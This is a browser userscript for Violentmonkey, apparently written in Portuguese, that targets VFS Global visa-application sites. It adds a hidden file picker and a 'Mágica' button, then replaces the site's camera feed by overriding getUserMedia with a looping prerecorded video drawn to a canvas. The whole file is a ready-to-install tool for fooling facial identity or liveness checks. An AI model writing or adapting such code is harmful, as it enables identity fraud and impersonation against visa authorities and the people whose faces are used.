// ==UserScript==
// @name         MAGIAS MÁGICAS
// @namespace    http://Violentmonkey. UserScript/
// @version      2.0
// @description  BOT FACIAL
// @author       LU CRUZ
// @match        https://idnvui.vfsglobal.com/*
// @match        https://visa.vfsglobal.com/*/*/prt/dashboard
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    async function substituirCamera(videoURL) {
        let video = document.createElement('video');
        video.src = videoURL;
        video.loop = true;
        video.muted = true;
        video.autoplay = true;
        await video.play();

        let canvas = document.createElement('canvas');
        let ctx = canvas.getContext('2d');

        canvas.width = 640;
        canvas.height = 480;

        function desenharFrame() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(desenharFrame);
        }

        desenharFrame();

        let stream = canvas.captureStream(30); // Simula uma câmera a 30 FPS

        // Interceptar o acesso à câmera do site
        navigator.mediaDevices.getUserMedia = async function(constraints) {
            return new Promise((resolve) => {
                resolve(stream);
            });
        };

        console.log("Magia ativada!");
    }

    // Criar botão para selecionar vídeo
    let videoButton = document.createElement('button');
    videoButton.textContent = 'Mágica';
    videoButton.style.position = 'fixed';
    videoButton.style.top = '10px';
    videoButton.style.right = '10px';
    videoButton.style.padding = '10px';
    videoButton.style.backgroundColor = 'green';
    videoButton.style.color = 'white';
    videoButton.style.border = 'none';
    videoButton.style.borderRadius = '5px';
    videoButton.style.cursor = 'pointer';
    videoButton.style.zIndex = '9999';

    document.body.appendChild(videoButton);

    // Criar input para selecionar vídeo (oculto)
    let fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = 'video/*';
    fileInput.style.display = 'none';
    document.body.appendChild(fileInput);

    // Evento para abrir seletor de arquivos
    videoButton.addEventListener('click', () => {
        fileInput.click();
    });

    // Evento para substituir a câmera pelo vídeo selecionado
    fileInput.addEventListener('change', (event) => {
        const file = event.target.files[0];
        if (file) {
            const url = URL.createObjectURL(file);
            substituirCamera(url);
        }
    });

})();